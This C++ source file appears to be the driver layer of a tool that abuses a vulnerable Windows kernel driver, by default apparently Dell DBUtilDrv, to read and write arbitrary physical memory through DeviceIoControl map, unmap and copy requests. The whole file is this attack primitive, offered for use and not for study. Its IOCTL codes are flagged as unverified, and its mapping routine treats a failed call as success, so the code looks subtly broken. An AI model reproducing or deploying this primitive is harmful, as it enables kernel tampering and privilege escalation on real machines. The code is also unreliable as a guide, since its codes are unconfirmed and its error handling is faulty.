#include "drv.h"
#include <cstring>
#include <cstdio>

namespace gdrv {
namespace {
    HANDLE  g_dev   = INVALID_HANDLE_VALUE;
    Mode    g_mode  = Mode::None;

    // Set at runtime in Open() from argv defaults: Dell DBUtilDrv range by default.
    DWORD   g_copy  = 0x9B332014;       // [UNVERIFIED] copy/readback ioctl
    DWORD   g_map   = 0x9B332808;      // [UNVERIFIED] map physical page -> returned VA
    DWORD   g_map2  = 0x9B332804;      // [UNVERIFIED] alternate map entry point
    DWORD   g_unmap = 0x9B33280C;      // [UNVERIFIED] unmap previously-mapped page

    struct COPY_REQ { uint64_t dst, src; uint32_t size, pad; };
    struct MAP_REQ  { uint64_t phys; uint32_t size, pad; };

    void* MapPage(uint64_t pa) {
        MAP_REQ req{};
        req.phys = pa; req.size = 0x1000; req.pad = 0;
        uint64_t out = 0;
        DWORD br = 0;
        static const DWORD codes[2] = {g_map, g_map2};
        for (int ci = 0; ci < 2; ++ci) {
            out = 0; br = 0;
            if (!DeviceIoControl(g_dev, codes[ci], &req, sizeof(req), &out, sizeof(out), &br, nullptr)) {
                if (out != 0) return reinterpret_cast<void*>((uintptr_t)((uint64_t)out));
                if (br > 0x10000) return reinterpret_cast<void*>((uintptr_t)((uint64_t)br));
            }
        }
        return nullptr;
    }

    void UnmapPage(void* va) {
        MAP_REQ req{reinterpret_cast<uint64_t>(reinterpret_cast<uintptr_t>(va)), 0x1000, 0};
        DWORD br = 0;
        DeviceIoControl(g_dev, g_unmap, &req, sizeof(req), nullptr, 0, &br, nullptr);
    }
} // anonymous

HANDLE GetDeviceHandle() noexcept { return g_dev; }
bool Ok()       noexcept           { return g_dev != INVALID_HANDLE_VALUE; }
Mode GetMode()  noexcept           { return g_mode; }

// ── ReadPhys: page-aligned map/unmap or direct copy depending on mode ────
bool ReadPhys(uint64_t pa, void* dst, size_t len) {
    if (!Ok()) return false;
    uint8_t* d = static_cast<uint8_t*>(dst);
    while (len) {
        const uint64_t page   = pa & ~0xFFFull;
        const size_t     off  = static_cast<size_t>(pa - page);
        const size_t     n    = (len < static_cast<size_t>(0x1000 - off)) ? len : static_cast<size_t>(0x1000 - off);

        if (g_mode == Mode::Map) {
            void* va = MapPage(page);
            if (!va) return false;
            std::memcpy(d, reinterpret_cast<uint8_t*>(va) + off, n);
            UnmapPage(va);
        } else if (g_mode == Mode::Copy) {
            COPY_REQ req{reinterpret_cast<uint64_t>(static_cast<uintptr_t>(d)), pa, static_cast<uint32_t>(n), 0};
            DWORD br = 0;
            if (!DeviceIoControl(g_dev, g_copy, &req, sizeof(req), nullptr, 0, &br, nullptr))
                return false;
        } else return false;

        pa += n; d += n; len -= n;
    }
    return true;
}

// ── WritePhys: same dual-path as ReadPhys ────
bool WritePhys(uint64_t pa, const void* src, size_t len) {
    if (!Ok()) return false;
    const uint8_t* s = static_cast<const uint8_t*>(src);
    while (len) {
        const uint64_t page   = pa & ~0xFFFull;
        const size_t     off  = static_cast<size_t>(pa - page);
        const size_t     n    = (len < static_cast<size_t>(0x1000 - off)) ? len : static_cast<size_t>(0x1000 - off);

        if (g_mode == Mode::Map) {
            void* va = MapPage(page);
            if (!va) return false;
            std::memcpy(reinterpret_cast<uint8_t*>(va) + off, s, n);
            UnmapPage(va);
        } else if (g_mode == Mode::Copy) {
            COPY_REQ req{pa, reinterpret_cast<uint64_t>(static_cast<uintptr_t>(s)), static_cast<uint32_t>(n), 0};
            DWORD br = 0;
            if (!DeviceIoControl(g_dev, g_copy, &req, sizeof(req), nullptr, 0, &br, nullptr))
                return false;
        } else return false;

        pa += n; s += n; len -= n;
    }
    return true;
}

// ── Open: accept device path + copy-IOCTL base from caller. All other codes derived by offset. ────
bool Open(const char* device, DWORD ioctlCopyBase) {
    // Resolve all IOCTL offsets relative to the supplied base
    g_copy   = ioctlCopyBase;
    g_map    = ioctlCopyBase + 0x10C;     // [UNVERIFIED] offset from copy-base -> map
    g_map2   = ioctlCopyBase + 0x108;     // [UNVERIFIED] alternate map entry point
    g_unmap  = ioctlCopyBase + 0x110;     // [UNVERIFIED] unmap offset

    printf("[gdrv] Opening device %s with copy-base=0x%08X\n", 
           device ? device : "(null)", ioctlCopyBase);

    g_dev = CreateFileA(device, GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("[gdrv] CreateFile(%s) failed: error=%lu\n", device, GetLastError());
        return false;
    }
    printf("[gdrv] Device open OK, handle=%p\n", g_dev);

    // Auto-detect mode by probing a known-safe physical address
    uint8_t probe[16]{};
    g_mode = Mode::Copy;
    if (ReadPhys(0x1000ULL, probe, sizeof(probe))) {
        printf("[gdrv] Mode auto-detected: Copy\n");
        return true;
    }

    g_mode = Mode::Map;
    if (ReadPhys(0x1000ULL, probe, sizeof(probe))) {
        printf("[gdrv] Mode auto-detected: Map\n");
        return true;
    }

    g_mode = Mode::None;
    Close();
    printf("[gdrv] Open() returned false - no mode works for this driver/device.\n");
    return false;
}

void Close() {
    if (g_dev != INVALID_HANDLE_VALUE) {
        CloseHandle(g_dev);
        g_dev = INVALID_HANDLE_VALUE;
    }
    g_mode = Mode::None;
}
// ── End of file ───────────────────────────────────────
